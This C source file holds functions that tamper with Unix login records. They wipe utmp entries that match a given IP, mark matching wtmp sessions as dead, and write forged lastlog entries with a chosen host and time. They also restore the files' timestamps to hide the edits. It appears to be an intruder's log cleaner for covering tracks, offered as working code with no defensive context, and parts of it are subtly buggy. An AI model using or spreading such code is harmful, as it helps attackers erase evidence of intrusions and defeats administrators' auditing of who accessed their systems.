#include "loginLog.h"
#include "rewrite_time.h"
#include "str2time.h"

int listLogInfo(const char *username){
	return 0;
}

int utmpUser(const char * filename,const char *username,const char *ip){
	int fd,ret;
	struct utmpx utmp_ent;
	if(NULL == filename){
		filename = UTMPFILE;
	}
	ret = save_time(filename);
	if(ret < 0){
		perror("Stat UTMPFILE");
	}
	if ((fd=open(filename,O_RDWR))>=0) {
		while(read (fd, &utmp_ent, sizeof (utmp_ent))> 0 ) {
			if (!strncmp(utmp_ent.ut_host,ip,strlen(ip))) {
				bzero((char *)&utmp_ent,sizeof( utmp_ent ));
				lseek (fd, -(sizeof (utmp_ent)), SEEK_CUR);
				write (fd, &utmp_ent, sizeof (utmp_ent));
			}
		}
	}else {
		perror("Open UTMPFILE");
		return -1;
	}
	close(fd);
	restore_time(filename);
	return 0;
}

int wtmpUser(const char *filename,const char *username,const char *ip){
	int ret=0;
	static struct utmpx *utp;
	if(NULL == filename){
		filename = WTMPFILE;
	}
	save_time(filename);
	utmpname(filename);
	setutxent();
	while ((utp = getutxent ())){
		if (utp->ut_type == USER_PROCESS &&
			strncmp (utp->ut_host ,ip,sizeof utp->ut_host)== 0 &&
			strncmp (utp->ut_user, username, sizeof utp->ut_user) == 0){
			memset(utp,0,sizeof utp);
			utp->ut_type = DEAD_PROCESS;
			if (pututxline (utp)){
				ret++;
			}else{
				ret++;
			}
		}
	}
	endutxent();
	restore_time(filename);
	return ret;
}

int modLastLog(const char *filename, const char *username, const char *ip, const char *ttyname, const char *str_time){
	struct passwd *p;
	struct lastlog ent;
	struct utimbuf currtime;
	int fd;
	memset(&ent,0,sizeof(struct lastlog));
	if(NULL == filename){
		filename = LASTLOGFILE;
	}
	save_time(filename);
	if ((p=getpwnam(username))==NULL){
		perror ("User doesn't exist...\n");
		exit (1);
	}
	if ((fd=open(filename,O_RDWR))<=0) {
		perror ("Can't open lastlog file...\n");
		exit (1);
	}
	strncpy(ent.ll_line,ttyname,strlen(ttyname));
	strncpy(ent.ll_host,ip,strlen(ip));
	ent.ll_time = str2time(str_time);
	lseek(fd,p->pw_uid*sizeof(struct lastlog),SEEK_SET);
	write(fd,&ent,sizeof(struct lastlog));
	close(fd);
	restore_time(filename);
	return 0;
}
